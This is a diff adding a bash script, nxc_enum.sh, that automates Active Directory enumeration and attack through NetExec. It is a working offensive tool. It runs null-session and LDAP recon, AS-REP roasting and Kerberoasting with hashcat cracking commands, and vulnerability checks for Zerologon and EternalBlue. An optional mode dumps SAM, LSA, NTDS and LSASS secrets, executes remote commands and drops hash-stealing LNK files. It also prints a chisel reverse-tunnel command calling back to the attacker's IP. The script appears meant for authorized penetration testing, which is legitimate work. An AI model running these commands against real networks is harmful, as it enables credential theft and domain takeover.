@@ -1,0 +1,324 @@
+#!/usr/bin/env bash
+#
+# nxc_enum.sh
+# Combined unauthenticated + authenticated Active Directory enumeration
+# using nxc (NetExec, the maintained successor to crackmapexec / cme).
+#
+# Behavior:
+#   - No credentials supplied  -> runs the UNAUTHENTICATED phase only
+#     (null-session SMB, anonymous LDAP, AS-REP roast against a user
+#     list, unauth vuln checks, RDP NLA screenshot).
+#   - Credentials supplied (-u with -p or -H) -> runs the unauth phase
+#     first (quick recon), then the full AUTHENTICATED phase (SMB/LDAP/
+#     RDP/MSSQL enum, roasting, popular modules, vuln scans, file ops,
+#     and optionally intrusive actions with -a).
+#
+# Usage:
+#   ./nxc_enum.sh -t <target> [-u <user> (-p <pass> | -H <hash>)] [options]
+#
+# Required:
+#   -t TARGET        IP, DNS, CIDR, or file of targets
+#
+# Credentials (omit all three to run unauth-only):
+#   -u USER          Username, username list, or file of usernames
+#   -p PASS          Password, password list, or file of passwords
+#   -H HASH          NTLM hash (used instead of -p)
+#
+# Optional:
+#   -d DOMAIN        Domain name (also used for -k / LDAP FQDN)
+#   -l               Use local authentication instead of domain auth (--local-auth)
+#   -k               Force Kerberos authentication (requires FQDN target)
+#   -a               AGGRESSIVE mode (authenticated phase only): also run
+#                    intrusive/modifying modules (secret dumps, command
+#                    execution, hash-stealing LNK/searchConnector drops).
+#                    Off by default.
+#   -x CMD           Command to execute on targets (requires -a)
+#   -s SHARE         Share name to spider in the File Operations section
+#   -U USERFILE      Username list/file for unauth AS-REP roasting
+#                    (default: ./users.txt if present)
+#   -o OUTDIR        Output directory (default: ./nxc_enum_<target>_<ts>)
+#
+# Examples:
+#   # Unauthenticated recon only
+#   ./nxc_enum.sh -t 10.10.10.5
+#
+#   # Unauth recon, then full authenticated enum + vuln scans
+#   ./nxc_enum.sh -t 10.10.10.5 -u jsmith -p 'Passw0rd!' -d corp.local
+#
+#   # Same, plus intrusive actions (secret dumps, command exec)
+#   ./nxc_enum.sh -t 10.10.10.5 -u jsmith -H <ntlm_hash> -d corp.local -a -x whoami
+
+set -uo pipefail
+
+TARGET=""; DOM_USER=""; PASS=""; HASH=""; DOMAIN=""
+LOCAL_AUTH=0; KERB=0; AGGRESSIVE=0; EXEC_CMD=""; SPIDER_SHARE=""
+USERFILE=""; OUTDIR=""
+
+while getopts "t:u:p:H:d:lkas:x:U:o:" opt; do
+    case "$opt" in
+        t) TARGET="$OPTARG" ;;
+        u) DOM_USER="$OPTARG" ;;
+        p) PASS="$OPTARG" ;;
+        H) HASH="$OPTARG" ;;
+        d) DOMAIN="$OPTARG" ;;
+        l) LOCAL_AUTH=1 ;;
+        k) KERB=1 ;;
+        a) AGGRESSIVE=1 ;;
+        x) EXEC_CMD="$OPTARG" ;;
+        s) SPIDER_SHARE="$OPTARG" ;;
+        U) USERFILE="$OPTARG" ;;
+        o) OUTDIR="$OPTARG" ;;
+        *) echo "Unknown option"; exit 1 ;;
+    esac
+done
+
+if [[ -z "$TARGET" ]]; then
+    echo "Usage: $0 -t <target> [-u <user> (-p <pass> | -H <hash>)] [-d domain] [-l] [-k] [-a] [-x cmd] [-s share] [-U userfile] [-o outdir]"
+    exit 1
+fi
+
+if ! command -v nxc >/dev/null 2>&1; then
+    echo "[!] nxc (NetExec) not found in PATH. Install it before running this script."
+    exit 1
+fi
+
+HAVE_CREDS=0
+if [[ -n "$DOM_USER" && ( -n "$PASS" || -n "$HASH" ) ]]; then
+    HAVE_CREDS=1
+fi
+
+CRED_FLAGS=()
+if [[ "$HAVE_CREDS" -eq 1 ]]; then
+    CRED_FLAGS=(-u "$DOM_USER")
+    if [[ -n "$HASH" ]]; then
+        CRED_FLAGS+=(-H "$HASH")
+    else
+        CRED_FLAGS+=(-p "$PASS")
+    fi
+    [[ -n "$DOMAIN" ]]        && CRED_FLAGS+=(-d "$DOMAIN")
+    [[ "$LOCAL_AUTH" -eq 1 ]] && CRED_FLAGS+=(--local-auth)
+    [[ "$KERB" -eq 1 ]]       && CRED_FLAGS+=(-k)
+fi
+
+[[ -z "$USERFILE" && -f "users.txt" ]] && USERFILE="users.txt"
+
+TS="$(date +%Y%m%d_%H%M%S)"
+SAFE_TARGET="$(echo "$TARGET" | tr '/\\:' '_')"
+OUTDIR="${OUTDIR:-./nxc_enum_${SAFE_TARGET}_${TS}}"
+mkdir -p "$OUTDIR"
+LOG="$OUTDIR/run.log"
+
+section() { echo -e "\n==================== $1 ====================" | tee -a "$LOG"; }
+
+run() {
+    local desc="$1"; shift
+    echo -e "\n[*] $desc" | tee -a "$LOG"
+    echo "    \$ $*" | tee -a "$LOG"
+    "$@" 2>&1 | tee -a "$LOG"
+}
+
+echo "Target      : $TARGET"                           | tee "$LOG"
+echo "Credentials : $([[ $HAVE_CREDS -eq 1 ]] && echo "$DOM_USER / ${DOMAIN:-<no domain>}" || echo "<none - unauth only>")" | tee -a "$LOG"
+echo "Aggressive  : $AGGRESSIVE"                        | tee -a "$LOG"
+echo "Start       : $(date)"                            | tee -a "$LOG"
+
+# =========================================================================
+# PHASE 1: UNAUTHENTICATED RECON (always runs)
+# =========================================================================
+section "PHASE 1: Unauthenticated Recon"
+
+run "Basic SMB host info (OS, SMB version, hostname, domain)" \
+    nxc smb "$TARGET"
+
+run "Identify hosts that do NOT require SMB signing (relay candidates)" \
+    nxc smb "$TARGET" --gen-relay-list "$OUTDIR/relay_list.txt"
+
+run "Test anonymous/null SMB logon" \
+    nxc smb "$TARGET" -u '' -p ''
+
+run "Test 'guest' account with blank password" \
+    nxc smb "$TARGET" -u 'guest' -p ''
+
+run "Enumerate shares via null session" \
+    nxc smb "$TARGET" -u '' -p '' --shares
+
+run "Enumerate domain users via null session" \
+    nxc smb "$TARGET" -u '' -p '' --users
+
+run "Enumerate domain groups via null session" \
+    nxc smb "$TARGET" -u '' -p '' --groups
+
+run "Enumerate password policy via null session" \
+    nxc smb "$TARGET" -u '' -p '' --pass-pol
+
+run "RID brute force via null session" \
+    nxc smb "$TARGET" -u '' -p '' --rid-brute
+
+run "Test anonymous LDAP bind" \
+    nxc ldap "$TARGET" -u '' -p ''
+
+run "Enumerate users via anonymous LDAP bind" \
+    nxc ldap "$TARGET" -u '' -p '' --users
+
+run "Enumerate groups via anonymous LDAP bind" \
+    nxc ldap "$TARGET" -u '' -p '' --groups
+
+run "Get domain SID via anonymous LDAP bind" \
+    nxc ldap "$TARGET" -u '' -p '' --get-sid
+
+if [[ -n "$USERFILE" && -f "$USERFILE" ]]; then
+    run "AS-REP roast using $USERFILE (no creds needed)" \
+        nxc ldap "$TARGET" -u "$USERFILE" -p '' --asreproast "$OUTDIR/asreproast_unauth.out"
+else
+    echo "[i] No username file found for unauth AS-REP roast (pass -U users.txt). Skipping." | tee -a "$LOG"
+fi
+
+run "Check for Zerologon (CVE-2020-1472)"    nxc smb "$TARGET" -M zerologon
+run "Check for PetitPotam coercion"          nxc smb "$TARGET" -M petitpotam
+run "Check for MS17-010 / EternalBlue"       nxc smb "$TARGET" -M ms17-010
+
+run "Screenshot RDP login prompt if NLA is disabled" \
+    nxc rdp "$TARGET" --nla-screenshot
+
+# =========================================================================
+# PHASE 2: AUTHENTICATED ENUMERATION (only if credentials were supplied)
+# =========================================================================
+if [[ "$HAVE_CREDS" -eq 0 ]]; then
+    section "PHASE 2: Authenticated Enumeration - SKIPPED"
+    echo "[i] No credentials supplied. Re-run with -u and -p/-H once you have a foothold." | tee -a "$LOG"
+    section "Summary"
+    echo "Finished: $(date)" | tee -a "$LOG"
+    echo "Full log and artifacts saved in: $OUTDIR" | tee -a "$LOG"
+    exit 0
+fi
+
+section "PHASE 2: Authenticated Enumeration"
+
+run "Verify credentials against SMB" \
+    nxc smb "$TARGET" "${CRED_FLAGS[@]}"
+
+# --- SMB Enumeration ---
+section "SMB Enumeration"
+run "Enumerate active sessions"      nxc smb "$TARGET" "${CRED_FLAGS[@]}" --sessions
+run "Enumerate share permissions"    nxc smb "$TARGET" "${CRED_FLAGS[@]}" --shares
+run "Enumerate disks"                nxc smb "$TARGET" "${CRED_FLAGS[@]}" --disks
+run "Enumerate domain computers"     nxc smb "$TARGET" "${CRED_FLAGS[@]}" --computers
+run "Enumerate logged-on users"      nxc smb "$TARGET" "${CRED_FLAGS[@]}" --loggedon-users
+run "Enumerate domain users"         nxc smb "$TARGET" "${CRED_FLAGS[@]}" --users
+run "Enumerate domain groups"        nxc smb "$TARGET" "${CRED_FLAGS[@]}" --groups
+run "Enumerate local groups"         nxc smb "$TARGET" "${CRED_FLAGS[@]}" --local-group
+run "RID brute force (default max)"  nxc smb "$TARGET" "${CRED_FLAGS[@]}" --rid-brute
+run "Enumerate password policy"      nxc smb "$TARGET" "${CRED_FLAGS[@]}" --pass-pol
+
+# --- LDAP Enumeration ---
+section "LDAP Enumeration"
+run "Enumerate enabled domain users"           nxc ldap "$TARGET" "${CRED_FLAGS[@]}" --users
+run "Enumerate domain groups"                  nxc ldap "$TARGET" "${CRED_FLAGS[@]}" --groups
+run "Users with PASSWD_NOTREQD flag"           nxc ldap "$TARGET" "${CRED_FLAGS[@]}" --password-not-required
+run "Users/computers trusted for delegation"   nxc ldap "$TARGET" "${CRED_FLAGS[@]}" --trusted-for-delegation
+run "Objects with adminCount=1"                nxc ldap "$TARGET" "${CRED_FLAGS[@]}" --admin-count
+run "Get domain SID"                           nxc ldap "$TARGET" "${CRED_FLAGS[@]}" --get-sid
+run "Enumerate GMSA passwords"                 nxc ldap "$TARGET" "${CRED_FLAGS[@]}" --gmsa
+
+# --- Finding Accounts: Roasting ---
+section "Account Roasting (authenticated)"
+run "AS-REP roast (no preauth accounts)" \
+    nxc ldap "$TARGET" "${CRED_FLAGS[@]}" --asreproast "$OUTDIR/asreproast.out"
+run "Kerberoast (SPN accounts)" \
+    nxc ldap "$TARGET" "${CRED_FLAGS[@]}" --kerberoasting "$OUTDIR/kerberoasting.out"
+
+echo -e "\n[i] Crack offline with hashcat:" | tee -a "$LOG"
+echo "    hashcat -m 18200 $OUTDIR/asreproast.out /usr/share/wordlists/rockyou.txt --force"   | tee -a "$LOG"
+echo "    hashcat -m 13100 $OUTDIR/kerberoasting.out /usr/share/wordlists/rockyou.txt --force" | tee -a "$LOG"
+
+# --- RDP Enumeration ---
+section "RDP Enumeration"
+run "Screenshot RDP login (NLA disabled)" nxc rdp "$TARGET" "${CRED_FLAGS[@]}" --nla-screenshot
+run "Screenshot RDP desktop on success"   nxc rdp "$TARGET" "${CRED_FLAGS[@]}" --screenshot
+
+# --- MSSQL Enumeration ---
+section "MSSQL Enumeration"
+run "Check MSSQL privileges for sysadmin escalation path" \
+    nxc mssql "$TARGET" "${CRED_FLAGS[@]}" -M mssql_priv
+
+# --- GPP / Autologon Credential Hunting ---
+section "GPP / Autologon Credential Hunting"
+run "Retrieve GPP passwords pushed via Group Policy"   nxc smb "$TARGET" "${CRED_FLAGS[@]}" -M gpp_password
+run "Retrieve GPP autologon credentials"               nxc smb "$TARGET" "${CRED_FLAGS[@]}" -M gpp_autologin
+
+# --- Popular Modules ---
+section "Popular Modules"
+run "DNS / IP info via LDAP"                      nxc ldap "$TARGET" "${CRED_FLAGS[@]}" -M get-network -o ALL=true
+run "LAPS - computers a user can read LAPS pw on"  nxc ldap "$TARGET" "${CRED_FLAGS[@]}" -M laps
+run "Machine Account Quota"                        nxc ldap "$TARGET" "${CRED_FLAGS[@]}" -M maq
+run "KeePass config discovery"                     nxc smb "$TARGET"  "${CRED_FLAGS[@]}" -M keepass_discover
+
+# --- Vulnerability Scan Modules ---
+section "Vulnerability Scan Modules"
+run "Zerologon (CVE-2020-1472)"                   nxc smb "$TARGET" "${CRED_FLAGS[@]}" -M zerologon
+run "PetitPotam coercion check"                   nxc smb "$TARGET" "${CRED_FLAGS[@]}" -M petitpotam
+run "MS17-010 / EternalBlue"                      nxc smb "$TARGET" "${CRED_FLAGS[@]}" -M ms17-010
+run "noPac (CVE-2021-42278 / 42287)"              nxc smb "$TARGET" "${CRED_FLAGS[@]}" -M nopac
+run "DFSCoerce check"                             nxc smb "$TARGET" "${CRED_FLAGS[@]}" -M dfscoerce
+run "ShadowCoerce check"                          nxc smb "$TARGET" "${CRED_FLAGS[@]}" -M shadowcoerce
+
+# --- File Operations ---
+section "File Operations"
+if [[ -n "$SPIDER_SHARE" ]]; then
+    run "Spider share '$SPIDER_SHARE' for interesting filenames" \
+        nxc smb "$TARGET" "${CRED_FLAGS[@]}" --spider "$SPIDER_SHARE" --pattern pass
+    run "Spider share '$SPIDER_SHARE' with content search" \
+        nxc smb "$TARGET" "${CRED_FLAGS[@]}" --spider "$SPIDER_SHARE" --pattern pass --content
+else
+    echo "[i] No -s SHARE given - skipping targeted spider. Running spider_plus across all shares instead." | tee -a "$LOG"
+fi
+run "Catalog all files across all shares (spider_plus, read-only)" \
+    nxc smb "$TARGET" "${CRED_FLAGS[@]}" -M spider_plus -o EXCLUDE_DIR=IPC\$,print\$,NETLOGON,SYSVOL
+
+# =========================================================================
+# AGGRESSIVE / INTRUSIVE SECTIONS - only run with -a
+# These modify target state, execute code, or dump credential material.
+# Only run against hosts you are explicitly authorized to test this way.
+# =========================================================================
+if [[ "$AGGRESSIVE" -eq 1 ]]; then
+
+    section "Extracting Secrets (AGGRESSIVE)"
+    run "Dump SAM"                          nxc smb "$TARGET" "${CRED_FLAGS[@]}" --sam
+    run "Dump LSA secrets"                  nxc smb "$TARGET" "${CRED_FLAGS[@]}" --lsa
+    run "Dump NTDS.dit (drsuapi method)"    nxc smb "$TARGET" "${CRED_FLAGS[@]}" --ntds
+    run "Dump LSASS memory via lsassy"      nxc smb "$TARGET" "${CRED_FLAGS[@]}" -M lsassy
+
+    section "Command Execution (AGGRESSIVE)"
+    if [[ -n "$EXEC_CMD" ]]; then
+        run "Execute CMD command via SMB"        nxc smb "$TARGET"   "${CRED_FLAGS[@]}" -x "$EXEC_CMD"
+        run "Execute Powershell command via SMB" nxc smb "$TARGET"   "${CRED_FLAGS[@]}" -X "$EXEC_CMD"
+        run "Execute command via WinRM"          nxc winrm "$TARGET" "${CRED_FLAGS[@]}" -x "$EXEC_CMD"
+    else
+        echo "[i] No -x CMD supplied - skipping command execution." | tee -a "$LOG"
+    fi
+
+    section "RDP Enable/Disable (AGGRESSIVE)"
+    echo "[i] Skipped by default. To enable RDP on the target, run:" | tee -a "$LOG"
+    echo "    nxc smb $TARGET ${CRED_FLAGS[*]} -M rdp -o ACTION=enable" | tee -a "$LOG"
+
+    section "Hash Stealing / Coercion Drops (AGGRESSIVE - leaves artifacts on target)"
+    echo "[i] Not auto-executed; requires your attack IP and a writable share." | tee -a "$LOG"
+    echo "    1) Start a listener first:  sudo responder -I tun0" | tee -a "$LOG"
+    echo "    2) Drop a malicious LNK:    nxc smb $TARGET ${CRED_FLAGS[*]} -M slinky -o SERVER=<YOUR_IP> NAME=<lnk_name>" | tee -a "$LOG"
+    echo "    3) Clean up afterwards:     nxc smb $TARGET ${CRED_FLAGS[*]} -M slinky -o SERVER=<YOUR_IP> NAME=<lnk_name> CLEAN=YES" | tee -a "$LOG"
+
+else
+    section "Aggressive Modules Skipped"
+    echo "[i] Re-run with -a to include secret dumps, command execution, and hash-stealing drops." | tee -a "$LOG"
+fi
+
+# -----------------------------------------------------------------------
+# Wrap up
+# -----------------------------------------------------------------------
+section "Summary"
+echo "Finished: $(date)"                        | tee -a "$LOG"
+echo "Full log and artifacts saved in: $OUTDIR"  | tee -a "$LOG"
+echo
+echo "Pivoting reminder (manual, not run automatically):"
+echo "  chisel server --reverse                                   (on your attack host)"
+echo "  nxc smb $TARGET ${CRED_FLAGS[*]} -x \"C:\\Windows\\Temp\\chisel.exe client <YOUR_IP>:8080 R:socks\""
